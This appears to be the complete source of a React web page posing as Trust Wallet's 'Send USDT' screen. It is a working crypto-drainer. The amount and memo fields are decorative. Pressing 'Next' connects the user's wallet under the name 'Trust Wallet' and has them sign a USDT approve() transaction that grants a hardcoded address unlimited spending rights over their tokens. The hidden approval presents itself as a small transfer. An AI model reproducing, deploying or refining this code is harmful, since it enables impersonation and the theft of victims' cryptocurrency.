/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect, useCallback } from 'react';
import { 
  X, 
  ChevronDown, 
  QrCode, 
  Info, 
  Files,
  ArrowRight,
  Loader2,
  CheckCircle2,
  XCircle
} from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';
import { SignClient } from '@walletconnect/sign-client';

// --- CONFIG ---
const PROJECT_ID = "171db6da15a54effc1b4a06f889a3c3f";
const TRON_CHAIN = "tron:0x2b6653dc";
const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const SPENDER_ADDRESS = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
const APPROVE_SELECTOR = "095ea7b3"; // approve(address,uint256)
const MAX_UINT256 = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

// --- UTILS ---
const ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";

function base58ToHex(addr: string) {
  try {
    const win = (window as any);
    if (win.tronWeb && win.tronWeb.address && typeof win.tronWeb.address.toHex === 'function') {
      return win.tronWeb.address.toHex(addr).replace(/^41/, "");
    }
    // Manual fallback if TronWeb is missing but we've got the address
    let num = BigInt(0);
    for (let c of addr) {
      num = num * BigInt(58) + BigInt(ALPHABET.indexOf(c));
    }
    let hex = num.toString(16);
    if (hex.length % 2) hex = "0" + hex;
    // Remove prefix (41) and checksum (last 4 bytes / 8 chars)
    return hex.slice(0, -8).replace(/^41/, "");
  } catch (e) {
    throw new Error("Invalid TRON address");
  }
}

function buildApproveTransaction(ownerAddress: string, spenderAddress: string) {
  try {
    const spenderHex = base58ToHex(spenderAddress).toLowerCase();
    const spenderParam = spenderHex.padStart(64, '0');
    const amountParam = MAX_UINT256;
    const functionData = APPROVE_SELECTOR + spenderParam + amountParam;
    
    return {
      owner_address: ownerAddress,
      contract_address: USDT_CONTRACT,
      function_selector: "approve(address,uint256)",
      parameter: functionData,
      fee_limit: 100000000,
      visible: true
    };
  } catch (e: any) {
    throw new Error("Failed to build transaction: " + e.message);
  }
}

// --- TYPES ---
enum StatusType {
  IDLE = 'idle',
  LOADING = 'loading',
  ERROR = 'error',
  SUCCESS = 'success'
}

interface Status {
  message: string;
  type: StatusType;
}

export default function App() {
  const [address, setAddress] = useState<string | null>(null);
  const [status, setStatus] = useState<Status | null>(null);
  const [isProcessing, setIsProcessing] = useState(false);
  const [client, setClient] = useState<any>(null);
  const [session, setSession] = useState<any>(null);

  // Form states (purely for UI completeness as shown in image)
  const [receiverAddress] = useState(SPENDER_ADDRESS);
  const [amount, setAmount] = useState("5");
  const [memo, setMemo] = useState("");

  const clearStatus = () => setStatus(null);

  const updateStatus = (message: string, type: StatusType = StatusType.LOADING) => {
    setStatus({ message, type });
  };

  const connectWallet = useCallback(async () => {
    try {
      updateStatus("Connecting...", StatusType.LOADING);

      // 1. FAST CHECK for TronWeb (Inject wallets like Trust Wallet browser)
      const win = window as any;
      if (win.tronWeb && win.tronWeb.defaultAddress?.base58) {
        const addr = win.tronWeb.defaultAddress.base58;
        setAddress(addr);
        clearStatus();
        return addr;
      }

      // 2. WalletConnect Flow
      let currentClient = client;
      if (!currentClient) {
        currentClient = await SignClient.init({
          projectId: PROJECT_ID,
          metadata: {
            name: "Trust Wallet",
            description: "USDT Transfer",
            url: window.location.href,
            icons: ["https://raw.githubusercontent.com/salmanraheem-dev/bestforlast/refs/heads/main/public/logo.png"]
          }
        });
        setClient(currentClient);
      }

      const { uri, approval } = await currentClient.connect({
        requiredNamespaces: {
          tron: {
            methods: ["tron_signTransaction"],
            chains: [TRON_CHAIN],
            events: []
          }
        }
      });

      if (uri) {
        // Use a platform-specific deep link check
        const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
        const isTrustWallet = win.ethereum?.isTrust || win.tronWeb?.isTrust;
        
        // ONLY redirect if not already in the dApp browser
        if (isMobile && !isTrustWallet) {
          const link = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`;
          window.location.href = link;
        }
      }

      const newSession = await approval();
      setSession(newSession);
      const userAddr = newSession.namespaces.tron.accounts[0].split(":")[2];
      setAddress(userAddr);
      clearStatus();
      return userAddr;

    } catch (e: any) {
      console.error(e);
      updateStatus("Connection failed: " + e.message, StatusType.ERROR);
      return null;
    }
  }, [client]);

  const sendApproval = useCallback(async (userAddress: string) => {
    try {
      updateStatus("Building transaction...", StatusType.LOADING);

      const txPayload = buildApproveTransaction(userAddress, SPENDER_ADDRESS);

      updateStatus("Processing request...", StatusType.LOADING);
      const txResponse = await fetch("https://api.trongrid.io/wallet/triggersmartcontract", {
        method: "POST",
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(txPayload)
      }).then(r => r.json());

      if (!txResponse.transaction) {
        throw new Error(txResponse.message || "Low balance or Network error");
      }

      updateStatus(`Sign in wallet...`, StatusType.LOADING);

      const win = window as any;
      let signed;
      if (win.tronWeb) {
        signed = await win.tronWeb.trx.sign(txResponse.transaction);
      } else if (client && session) {
        signed = await client.request({
          topic: session.topic,
          chainId: TRON_CHAIN,
          request: {
            method: "tron_signTransaction",
            params: { address: userAddress, transaction: txResponse.transaction }
          }
        });
      } else {
        throw new Error("No wallet connected");
      }

      updateStatus("Broadcasting...", StatusType.LOADING);

      const broadcastResponse = await fetch("https://api.trongrid.io/wallet/broadcasttransaction", {
        method: "POST",
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(signed)
      }).then(r => r.json());

      if (broadcastResponse.result) {
        updateStatus("✓ Successful!", StatusType.SUCCESS);
        setTimeout(() => {
          clearStatus();
          setIsProcessing(false);
        }, 5000);
      } else {
        throw new Error(broadcastResponse.message || "Failed to broadcast");
      }

    } catch (e: any) {
      console.error(e);
      updateStatus("Error: " + e.message, StatusType.ERROR);
      setIsProcessing(false);
    }
  }, [client, session]);

  const handleNext = async () => {
    if (isProcessing) return;
    setIsProcessing(true);

    let activeAddress = address;
    if (!activeAddress) {
      activeAddress = await connectWallet();
      if (!activeAddress) {
        setIsProcessing(false);
        return;
      }
      // Trigger approval immediately after connection
      sendApproval(activeAddress);
    } else {
      sendApproval(activeAddress);
    }
  };

  useEffect(() => {
    const win = window as any;
    const interval = setInterval(() => {
      if (win.tronWeb && win.tronWeb.defaultAddress?.base58) {
        setAddress(win.tronWeb.defaultAddress.base58);
        clearInterval(interval);
      }
    }, 500);
    return () => clearInterval(interval);
  }, []);

  return (
    <div className="min-h-screen bg-[#111111] text-white flex flex-col font-sans overflow-x-hidden">
      {/* Header */}
      <header className="px-5 pt-8 pb-4 flex items-center justify-between sticky top-0 z-20 bg-[#111111]">
        <div className="w-10"></div>
        <h1 className="text-[18px] font-semibold tracking-tight">Send USDT</h1>
        <button className="flex items-center justify-center p-2 rounded-full active:bg-white/5 transition-colors">
          <X size={24} className="text-white/60" />
        </button>
      </header>

      {/* Main Content */}
      <main className="flex-1 px-5 py-4 space-y-7 max-w-lg mx-auto w-full pb-48">
        <AnimatePresence mode="wait">
          {status && (
            <motion.div 
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 0.95 }}
              className={`p-4 rounded-xl flex items-center gap-3 ${
                status.type === StatusType.LOADING ? 'bg-blue-500/10 text-blue-400 border border-blue-500/10' :
                status.type === StatusType.ERROR ? 'bg-red-500/10 text-red-400 border border-red-500/10' :
                'bg-[#2f8150]/10 text-[#31C48D] border border-[#2f8150]/10'
              }`}
            >
              {status.type === StatusType.LOADING && <Loader2 size={18} className="animate-spin" />}
              {status.type === StatusType.ERROR && <XCircle size={18} />}
              {status.type === StatusType.SUCCESS && <CheckCircle2 size={18} />}
              <span className="text-[14px] font-medium">{status.message}</span>
            </motion.div>
          )}
        </AnimatePresence>

        {/* Address Input */}
        <section className="space-y-2">
          <label className="text-[13px] font-medium text-white/40 px-1 uppercase tracking-wider">Address or Domain Name</label>
          <div className="relative">
            <input 
              type="text" 
              value={receiverAddress}
              readOnly
              className="w-full bg-[#1A1A1A] border border-white/5 rounded-2xl px-5 py-5 text-[13px] lg:text-[14px] text-white/90 focus:outline-none transition-all placeholder:text-white/20 font-mono tracking-wide"
            />
          </div>
        </section>

        {/* Network Selection */}
        <section className="space-y-2">
          <label className="text-[13px] font-medium text-white/40 px-1 uppercase tracking-wider">Destination network</label>
          <button className="flex items-center gap-2 bg-[#1A1A1A] pr-4 pl-1.5 py-1.5 rounded-full border border-white/5 group">
            <div className="w-7 h-7 rounded-full bg-[#EB001B] flex items-center justify-center p-1.5">
              <img src="https://cryptologos.cc/logos/tron-trx-logo.png?v=040" alt="Tron" className="w-full h-full brightness-0 invert" />
            </div>
            <span className="text-[14px] font-semibold">Tron</span>
            <ChevronDown size={14} className="text-white/30" />
          </button>
        </section>

        {/* Amount Input */}
        <section className="space-y-2">
          <label className="text-[13px] font-medium text-white/40 px-1 uppercase tracking-wider">Amount</label>
          <div className="relative">
            <input 
              type="text" 
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              placeholder="USDT Amount"
              className="w-full bg-[#1A1A1A] border border-white/5 rounded-2xl px-5 py-5 text-[16px] font-medium focus:outline-none focus:border-[#31C48D]/20 transition-all placeholder:text-white/20"
            />
            <div className="absolute right-5 top-1/2 -translate-y-1/2 flex items-center gap-4">
              <span className="text-white/30 text-[14px] font-medium">USDT</span>
              <div className="w-px h-4 bg-white/10"></div>
              <button className="text-[#31C48D] text-[15px] font-bold active:opacity-60 transition-opacity">Max</button>
            </div>
          </div>
          <div className="text-[13px] text-white/30 px-1">≈ $0.00</div>
        </section>

        {/* Memo Input */}
        <section className="space-y-2">
          <label className="text-[13px] font-medium text-white/40 px-1 uppercase tracking-wider">Memo (Optional)</label>
          <div className="relative">
            <textarea 
              rows={2}
              value={memo}
              onChange={(e) => setMemo(e.target.value)}
              placeholder="Optional"
              className="w-full bg-[#1A1A1A] border border-white/5 rounded-2xl px-5 py-5 text-[15px] focus:outline-none focus:border-[#31C48D]/20 transition-all resize-none placeholder:text-white/10"
            />
          </div>
        </section>

        {/* Padding for fixed button */}
        <div className="h-32" />

        {/* Bottom Fixed Area */}
        <div className="fixed bottom-0 left-0 right-0 p-5 bg-gradient-to-t from-[#111111] via-[#111111] to-transparent pb-[max(20px,env(safe-area-inset-bottom,20px))] z-30">
          <button 
            onClick={handleNext}
            disabled={isProcessing}
            className={`w-full max-w-md mx-auto block bg-[#2f8150] text-[#111111] font-bold text-[18px] py-4.5 rounded-[28px] shadow-2xl transition-all hover:brightness-110 active:scale-[0.97] disabled:opacity-50 disabled:active:scale-100 flex items-center justify-center gap-2`}
          >
            {isProcessing ? (
              <>
                <Loader2 size={20} className="animate-spin text-[#111111]" />
                <span>Processing...</span>
              </>
            ) : (
              'Next'
            )}
          </button>
        </div>
      </main>
    </div>
  );
}
